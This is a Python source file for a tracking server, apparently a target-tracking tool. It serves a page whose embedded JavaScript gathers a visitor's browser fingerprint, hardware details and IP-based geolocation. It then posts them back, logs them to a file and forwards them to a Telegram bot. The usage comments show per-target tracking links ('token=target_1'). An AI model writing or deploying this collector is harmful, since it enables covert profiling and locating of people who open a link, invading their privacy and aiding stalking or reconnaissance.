import http.server
import json
import requests
from urllib.parse import urlparse, parse_qs

# Telegram bot settings
TELEGRAM_BOT_TOKEN = ''
CHAT_ID = ''

def save_to_file(data):
    with open('collected_info.json', 'a') as file:
        json.dump(data, file)
        file.write("\n")

def send_to_telegram(data):
    token = data.get('token', 'N/A')
    message = (
        f"<b>Tracking Token:</b> <code>{token}</code>\n\n"
        "<b>New Visitor Information:</b>\n\n"
        "<b>IP Address:</b> <code>{ip}</code>\n"
        "<b>User-Agent:</b> <code>{user_agent}</code>\n"
        "<b>System Info:</b> <code>{system_info}</code>\n"
        "<b>Screen Size:</b> <code>{screen_width} x {screen_height}</code>\n"
        "<b>Color Depth:</b> <code>{screen_color_depth} bits</code>\n"
        "<b>Language:</b> <code>{language}</code>\n"
        "<b>Timezone:</b> <code>{timezone}</code>\n"
        "<b>Cookies Enabled:</b> <code>{cookies_enabled}</code>\n"
        "<b>Java Enabled:</b> <code>{java_enabled}</code>\n"
        "<b>Platform Version:</b> <code>{platform_version}</code>\n"
        "<b>Browser:</b> <code>{browser_name} {browser_version}</code>\n"
        "<b>Geolocation:</b> <code>{geolocation}</code>\n"
        "<b>CPU Cores:</b> <code>{cpu_cores}</code>\n"
        "<b>Memory Usage:</b> <code>{memory_usage} MB</code>"
    ).format(
        ip=data.get('ip', 'N/A'),
        user_agent=data.get('user_agent', 'N/A'),
        system_info=data.get('system_info', 'N/A'),
        screen_width=data.get('screen_width', 'N/A'),
        screen_height=data.get('screen_height', 'N/A'),
        screen_color_depth=data.get('screen_color_depth', 'N/A'),
        language=data.get('language', 'N/A'),
        timezone=data.get('timezone', 'N/A'),
        cookies_enabled=data.get('cookies_enabled', 'N/A'),
        java_enabled=data.get('java_enabled', 'N/A'),
        platform_version=data.get('platform_version', 'N/A'),
        browser_name=data.get('browser_name', 'N/A'),
        browser_version=data.get('browser_version', 'N/A'),
        geolocation=data.get('geolocation', 'N/A'),
        cpu_cores=data.get('cpu_cores', 'N/A'),
        memory_usage=data.get('memory_usage', 'N/A')
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    response = requests.get(url, params=params)
    return response.json()

# JavaScript template with a placeholder for the token
javascript_code = """
<script>
    const token = /*TOKEN_PLACEHOLDER*/;

    const userInfo = {
        token: token,
        ip: window.location.hostname,
        user_agent: navigator.userAgent,
        system_info: navigator.platform,
        screen_width: window.screen.width,
        screen_height: window.screen.height,
        screen_color_depth: window.screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies_enabled: navigator.cookieEnabled,
        java_enabled: navigator.javaEnabled(),
        platform_version: navigator.appVersion,
        browser_name: navigator.appName,
        browser_version: navigator.appVersion,
        cpu_cores: navigator.hardwareConcurrency || 'N/A'
    };

    if (performance.memory) {
        userInfo.memory_usage = (performance.memory.usedJSHeapSize / (1024 * 1024)).toFixed(2);
    } else {
        userInfo.memory_usage = 'N/A';
    }

    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            userInfo.geolocation = data.city + ', ' + data.region + ', ' + data.country;
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userInfo),
            });
        })
        .catch(() => {
            userInfo.geolocation = 'Location not available';
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userInfo),
            });
        });
</script>
"""

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        query_params = parse_qs(parsed_url.query)

        if path == '/track' and 'token' in query_params:
            token = query_params['token'][0]
            js_with_token = javascript_code.replace('/*TOKEN_PLACEHOLDER*/', f'"{token}"')

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_content = f"""
                <html>
                    <body>
                        <h1>Tracking Page</h1>
                        <p>This page tracks user information and sends it to the server.</p>
                        {js_with_token}
                    </body>
                </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            save_to_file(data)
            send_to_telegram(data)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=http.server.HTTPServer, handler_class=RequestHandler):
    server_address = ('', 5000)
    httpd = server_class(server_address, handler_class)
    print('Starting server at http://localhost:5000')
    httpd.serve_forever()

if __name__ == '__main__':
    run()

# USAGE:
#http://your-ip-or-domain:5000/track?token=target_2
#http://your-ip-or-domain:5000/track?token=target_1
